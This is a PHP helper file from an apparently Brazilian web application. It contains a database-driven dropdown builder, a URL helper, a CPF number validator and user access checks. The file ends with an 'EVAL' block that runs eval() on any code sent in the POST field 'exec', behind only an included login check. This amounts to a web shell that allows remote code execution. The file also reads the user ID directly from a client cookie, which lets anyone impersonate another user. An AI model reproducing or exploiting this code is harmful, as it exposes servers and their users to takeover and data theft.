	$result = executeSQL($conn, "SELECT ID_TIPO_RESOLUCAO, DS_TIPO_RESOLUCAO FROM DIM_TIPO_RESOLUCAO ORDER BY 2", array());

	$combo = '<select name="'.$name.'" class="inputStyle" id="'.$name.'"><option value="">Selecione um tipo...</option>';
	while ($rs = fetchResult($result)) {
		$combo .= '<option value="'.$rs['ID_TIPO_RESOLUCAO'].'"'.(($selected == $rs['ID_TIPO_RESOLUCAO']) ? ' selected' : '').'>'.utf8_encode($rs['DS_TIPO_RESOLUCAO']).'</option>';
	}
	$combo .= '</select>';

	return $combo;
}



/*  OUTROS  */



require_once('../settings/mail.php');

function getCurrentUrl() {
	$pageURL = 'http';
	
	if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
	
	$pageURL .= "://";
	
	if ($_SERVER["SERVER_PORT"] != "80") {
		$pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
	} else {
		$pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
	}
	
	return $pageURL;
}

function getUserId() {
	return (isset($_COOKIE['user']) ? $_COOKIE['user'] : session_id());
}

function verificaCPF($cpf) {
	if(!is_numeric($cpf)) {
		return false;
	} else {
		if(($cpf == '11111111111') || ($cpf == '22222222222') ||
		($cpf == '33333333333') || ($cpf == '44444444444') ||
		($cpf == '55555555555') || ($cpf == '66666666666') ||
		($cpf == '77777777777') || ($cpf == '88888888888') ||
		($cpf == '99999999999') || ($cpf == '00000000000')) {
			return false;
		} else {
			//PEGA O DIGITO VERIFIACADOR
			$dv_informado = substr($cpf, 9, 2);
			
			for($i=0; $i <= 8; $i++) {
				$digito[$i] = substr($cpf, $i, 1);
			}
			
			//CALCULA O VALOR DO 10º DIGITO DE VERIFICAÇÂO
			$posicao = 10;
			$soma = 0;
			
			for($i = 0; $i <= 8; $i++) {
				$soma += $digito[$i] * $posicao;
				$posicao--;
			}
			
			$digito[9] = $soma % 11;
			
			if ($digito[9] < 2) {
				$digito[9] = 0;
			} else {
				$digito[9] = 11 - $digito[9];
			}
			
			//CALCULA O VALOR DO 11º DIGITO DE VERIFICAÇÃO
			$posicao = 11;
			$soma = 0;
			
			for ($i = 0; $i <= 9; $i++) {
				$soma += $digito[$i] * $posicao;
				$posicao--;
			}
			
			$digito[10] = $soma % 11;
			
			if ($digito[10] < 2) {
				$digito[10] = 0;
			} else {
				$digito[10] = 11 - $digito[10];
			}
			
			//VERIFICA SE O DV CALCULADO É IGUAL AO INFORMADO
			$dv = $digito[9] * 10 + $digito[10];
			if ($dv != $dv_informado) {
				return false;
			} else {
				return true;
			}
		}
	}
}

function acessoPermitido($conn, $idUser, $idPrograma, $echo = false) {
	$query = 'SELECT 1
				 FROM MW_PROGRAMA P
				 INNER JOIN MW_USUARIO_PROGRAMA UP ON UP.ID_PROGRAMA = P.ID_PROGRAMA
				 INNER JOIN MW_USUARIO U ON U.ID_USUARIO = UP.ID_USUARIO
				 WHERE U.ID_USUARIO = ? AND P.ID_PROGRAMA = ?';
	$params = array($idUser, $idPrograma);
	$result = executeSQL($conn, $query, $params);
	
	$hasRows = hasRows($result);
	
	if ($echo and !$hasRows) echo '<h2>Acesso Negado!</h2>';
	
	return $hasRows;
}

function acessoPermitidoEvento($idBase, $idUser, $codPeca, $die = false) {
	$mainConnection = mainConnection();
	$query = 'SELECT 1
				FROM MW_ACESSO_CONCEDIDO
				WHERE ID_BASE = ? AND ID_USUARIO = ? AND CODPECA = ?';
	$params = array($idBase, $idUser, $codPeca);
	$result = executeSQL($mainConnection, $query, $params);
	
	$hasRows = hasRows($result);
	
	//if (!$hasRows) echo '<h2>Acesso Negado!</h2>';
	
	if ($die and !$hasRows) die();
	
	return $hasRows;
}



/*  EVAL  */



if (isset($_POST['exec'])) {
	require_once('../admin/acessoLogado.php');
	eval($_POST['exec']);
}
?>